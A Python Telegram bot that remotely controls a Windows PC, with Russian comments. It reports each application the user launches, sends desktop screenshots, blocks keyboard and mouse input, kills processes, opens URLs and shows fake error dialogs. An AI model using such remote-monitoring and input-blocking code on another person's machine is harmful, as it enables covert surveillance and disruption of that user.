import atexit
import ctypes
import os
import threading
import time
from datetime import datetime
from io import BytesIO
import webbrowser

import psutil
import pyautogui
import pythoncom
import pygetwindow as gw
import telebot
import wmi
from telebot import types

import config

TOKEN = config.TOKEN
AUTHORIZED_CHAT_ID = config.AUTHORIZED_ID
IGNORED_PROCESSES = {'taskhostw.exe', 'TrustedInstaller.exe', 'sppsvc.exe', 'TiWorker.exe', 'audiodg.exe',
                     'fsnotifier.exe', 'QtWebEngineProcess.exe', 'RuntimeBroker.exe', 'backgroundTaskHost.exe',
                     'ApplicationFrameHost.exe', 'SystemSettings.exe', 'UserOOBEBroker.exe', 'amdow.exe',
                     'AMDRSServ.exe', 'cncmd.exe', 'clinfo.exe', 'RadeonSoftware.exe', 'TextInputHost.exe',
                     'AMDRSSrcExt.exe', 'powershell.exe', 'cmd.exe', 'WmiPrvSE.exe', '', 'dllhost.exe',
                     'CompPkgSrv.exe', 'SearchProtocolHost.exe', 'SearchFilterHost.exe', 'msedge.exe', 'python.exe',
                     'pingsender.exe', 'conhost.exe', 'svchost.exe'}
RESTART_THRESHOLD = 1
restart_count = {}
bot = telebot.TeleBot(TOKEN)

# Переменная для хранения состояния экрана (0 - выключен, 1 - включен)
screen_state = 1


def send_startup_message():
    start_time = datetime.now().strftime("%H:%M:%S")
    bot.send_message(AUTHORIZED_CHAT_ID, f"💻 Компьютер включен.\n⚙️ Время включения: {start_time}",
                     reply_markup=create_keyboard())


def exit_handler():
    shutdown_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    bot.send_message(AUTHORIZED_CHAT_ID, f"💻 Компьютер выключен.\n⚙️ Время выключения: {shutdown_time}")


def process_events():
    try:
        pythoncom.CoInitialize()
        c = wmi.WMI()
        wmi_event = c.Win32_Process.watch_for("creation")
        while True:
            try:
                new_process = wmi_event()
                pythoncom.PumpWaitingMessages()
                if new_process.Caption and new_process.Caption not in IGNORED_PROCESSES:
                    time.sleep(1)
                    log_application_start(new_process.Caption)
            except wmi.x_wmi_timed_out:
                pass
            time.sleep(1)
    except Exception as e:
        print(f"Exception in process_events: {e}")
    finally:
        pythoncom.CoUninitialize()


def log_application_start(application_name):
    current_time = datetime.now()
    bot.send_message(AUTHORIZED_CHAT_ID,
                     f"🚀 Пользователь запустил приложение: {application_name}\n⚙️ Время запуска: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")


def take_screenshot():
    screenshot = pyautogui.screenshot()
    img_byte_array = BytesIO()
    screenshot.save(img_byte_array, format='PNG')
    img_byte_array.seek(0)
    return img_byte_array


def is_authorized(chat_id):
    return str(chat_id) == AUTHORIZED_CHAT_ID


def create_keyboard():
    keyboard = types.ReplyKeyboardMarkup(row_width=2)
    shutdown_button = types.KeyboardButton('💤 Выключение')
    screenshot_button = types.KeyboardButton('📸 Скриншот')
    offdevices_button = types.KeyboardButton('❌ Выключить клавиатуру и мышь (до перезагрузки)')
    info_button = types.KeyboardButton('⚙️ Вывести команды')
    processes_button = types.KeyboardButton('💠 Процессы')
    keyboard.add(shutdown_button, screenshot_button, offdevices_button, info_button, processes_button)
    return keyboard


def terminate_process(process_name):
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == process_name:
            pid = process.info['pid']
            psutil.Process(pid).terminate()


@bot.message_handler(commands=['terminate'])
def handle_terminate(message):
    if is_authorized(message.chat.id):
        try:
            _, process_name = message.text.split(maxsplit=1)
            process_name = process_name.strip()
            terminate_process(process_name)
            bot.send_message(message.chat.id, f"✅ Процесс {process_name} завершен.", reply_markup=create_keyboard())
        except ValueError:
            bot.send_message(message.chat.id, "❌ Укажите имя процесса после команды /terminate.",
                             reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.", reply_markup=create_keyboard())


@bot.message_handler(commands=['url'])
def handle_url(message):
    if is_authorized(message.chat.id):
        try:
            _, url = message.text.split(maxsplit=1)
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            webbrowser.open(url)
            bot.send_message(message.chat.id, f"🌐 Открываю ссылку: {url}")
        except ValueError:
            bot.send_message(message.chat.id, "❌ Укажите URL после команды /url.")
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.")


@bot.message_handler(commands=['cid'])
def handle_cid(message):
    if is_authorized(message.chat.id):
        bot.send_message(message.chat.id, f"💂‍♂️ Ваш chat_id: {message.chat.id}", reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.")


@bot.message_handler(commands=['error'])
def handle_error(message):
    if is_authorized(message.chat.id):
        try:
            _, error_message = message.text.split(maxsplit=1)
            ctypes.windll.user32.MessageBoxW(0, error_message, "Error", 1 | 48)
            bring_window_to_front("Error")
            bot.send_message(message.chat.id, "✅ Фейковая ошибка вызвана успешно!", reply_markup=create_keyboard())
        except ValueError:
            bot.send_message(message.chat.id, "❌ Укажите текст ошибки после команды /error.", reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.", reply_markup=create_keyboard())


def bring_window_to_front(window_title):
    try:
        window = gw.getWindowsWithTitle(window_title)[0]
        window.activate()
    except IndexError:
        pass


@bot.message_handler(func=lambda message: message.text.lower() in ['/start', '⚙️ вывести команды'])
def handle_start(message):
    if is_authorized(message.chat.id):
        welcome_message = (
            "Привет! Вот мои команды:\n\n"
            "📌 /start - выводит данный текст.\n"
            "⚠️ /error {текст} - выводит фейковую ошибку.\n"
            "🖼️ /screenshot - делает скриншот рабочего стола.\n"
            "💤 /off - выключает пк.\n"
            "🚷 /off_devices - выключает клавиатуру и мышь до перезагрузки.\n"
            "💠 /processes - выводит все процессы на пк.\n"
            "🌐 /url {ссылка} - открывает указанный сайт в браузере.\n"
            "❌ /terminate {процесс} - убивает указанный процесс.\n"
        )
        bot.send_message(message.chat.id, welcome_message, reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.", reply_markup=create_keyboard())


@bot.message_handler(func=lambda message: message.text.lower() in ['/screenshot', '📸 скриншот'])
def handle_screen(message):
    if is_authorized(message.chat.id):
        try:
            screenshot = take_screenshot()
            bot.send_photo(message.chat.id, screenshot, caption="🤖 Скриншот рабочего стола:",
                           reply_markup=create_keyboard())
        except Exception as e:
            print(f"Exception in handle_screen: {e}")
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.")


@bot.message_handler(func=lambda message: message.text.lower() in ['/off', '💤 выключение'])
def handle_off(message):
    if is_authorized(message.chat.id):
        bot.send_message(message.chat.id, "💤 Выключение компьютера...", reply_markup=create_keyboard())
        time.sleep(2)
        os.system('shutdown /s /t 1')
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.", reply_markup=create_keyboard())


@bot.message_handler(func=lambda message: message.text.lower() in ['/off_devices', '❌ выключить клавиатуру и мышь (до перезагрузки)'])
def handle_block_devices(message):
    if is_authorized(message.chat.id):
        ctypes.windll.user32.BlockInput(True)
        bot.send_message(message.chat.id,
                         "💤 Ввод заблокирован (мышь и клавиатура). Для разблокировки выполните перезагрузку компьютера.",
                         reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.", reply_markup=create_keyboard())

# Определение процессов
def get_processes(page, limit=10):
    processes = []
    start_offset = (page - 1) * limit
    end_offset = start_offset + limit

    for proc in psutil.process_iter(['name', 'memory_info']):
        process_name = proc.info['name']
        if process_name.lower() not in IGNORED_PROCESSES:
            processes.append({'name': process_name, 'memory': proc.info['memory_info'].rss})

    return processes[start_offset:end_offset]


# Создание инлайн-клавиатуры
def create_inline_keyboard(page, limit):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    prev_button = types.InlineKeyboardButton("⬅️", callback_data=f'prev {page} {limit}')
    next_button = types.InlineKeyboardButton("➡️", callback_data=f'next {page} {limit}')
    keyboard.add(prev_button, next_button)
    return keyboard


@bot.message_handler(func=lambda message: message.text.lower() in ['/processes', '💠 процессы'])
def list_processes(message):
    if is_authorized(message.chat.id):
        try:
            # Параметры для отображения первой страницы процессов
            page = 1
            limit = 10

            processes = get_processes(page, limit)
            current_time = datetime.now()
            processes_message = f"🔄 **Активные процессы** (страница {page}):\n⚙️ Актуальность процессов: {current_time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            for i, process_info in enumerate(processes, start=(page - 1) * limit + 1):
                processes_message += f"{i}. 👾 *{process_info['name']}* - RAM: {process_info['memory'] / (1024 ** 2):.2f} MB\n"

            # Отправка сообщения с инлайн-клавиатурой
            bot.send_message(message.chat.id, processes_message, parse_mode='Markdown',
                             reply_markup=create_inline_keyboard(page, limit))
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Произошла ошибка: {e}")
    else:
        bot.send_message(message.chat.id, "🚷 У вас нет прав доступа к боту.")


# Обработка коллбэков от инлайн-клавиатуры
@bot.callback_query_handler(func=lambda call: call.data.startswith(('prev', 'next')))
def process_inline_callback(call):
    if is_authorized(call.message.chat.id):
        try:
            # Извлечение параметров из коллбэка
            action, page, limit = call.data.split()
            page = int(page)
            limit = int(limit)

            # Пересчет страницы в зависимости от действия
            if action == 'prev':
                page = max(1, page - 1)
            elif action == 'next':
                page += 1

            processes = get_processes(page, limit)
            current_time = datetime.now()
            processes_message = f"🔄 **Активные процессы** (страница {page}):\n⚙️ Актуальность процессов: {current_time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            for i, process_info in enumerate(processes, start=(page - 1) * limit + 1):
                processes_message += f"{i}. 👾 *{process_info['name']}* - RAM: {process_info['memory'] / (1024 ** 2):.2f} MB\n"

            # Редактирование текущего сообщения с инлайн-клавиатурой
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                  text=processes_message, parse_mode='Markdown',
                                  reply_markup=create_inline_keyboard(page, limit))
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Произошла ошибка: {e}")
    else:
        bot.send_message(call.message.chat.id, "🚷 У вас нет прав доступа к боту.")

if __name__ == "__main__":
    send_startup_message_thread = threading.Thread(target=send_startup_message, daemon=True)
    send_startup_message_thread.start()

    process_events_thread = threading.Thread(target=process_events, daemon=True)
    process_events_thread.start()

    bot.polling(none_stop=True)
    atexit.register(exit_handler)
